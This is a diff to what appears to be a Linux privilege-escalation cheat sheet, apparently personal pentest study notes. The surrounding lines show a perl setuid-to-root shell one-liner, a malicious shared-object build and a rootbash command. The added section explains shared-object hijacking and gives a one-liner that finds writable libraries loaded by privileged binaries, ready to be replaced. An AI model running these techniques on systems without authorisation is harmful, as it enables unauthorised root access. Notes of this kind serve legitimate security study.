@@ -686,9 +686,9 @@ getcap -r / 2>/dev/null
 
 # If perl has cap_setuid+ep
 /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
-
-#There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc
 ```
+There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc
+
 ### Shell Escape Sequences
 
 Check GTFOBins for exploitation techniques: [GTFOBins](https://gtfobins.github.io/)
@@ -736,6 +736,15 @@ gcc -shared -fPIC -o /path/to/missing.so /tmp/evil.c
 # Execute with elevated privileges
 /tmp/rootbash -p
 ```
+### Shared Object Hijacking
+Requirements:
+ - A eleavtred program is running/calling a SO file you have write permissions over OR
+ - You have write permissions over a directory in which a privlidged/elebvated program is calling a .so file OR
+ - You own a directory in which a SO file is called from by a privlidged process(this appears differently then having explicit write permissions)
+```bash
+ldd /usr/bin/some_binary | awk '{print $3}' | grep '^/' | while read -r so; do [ -w "$so" ] && echo "File Write: $so"; [ -w "$(dirname "$so")" ] && echo "Dir Write: $(dirname "$so")/$"; done
+```
+This will show you which file you could write to and then replace it using .so payload I had referenced elsewehre via cat bad.so > writrable_target.so. The same would be if its directory was writable to your user.
 
 ### One-liners to Hunt for Vulnerable SUID Binaries
 
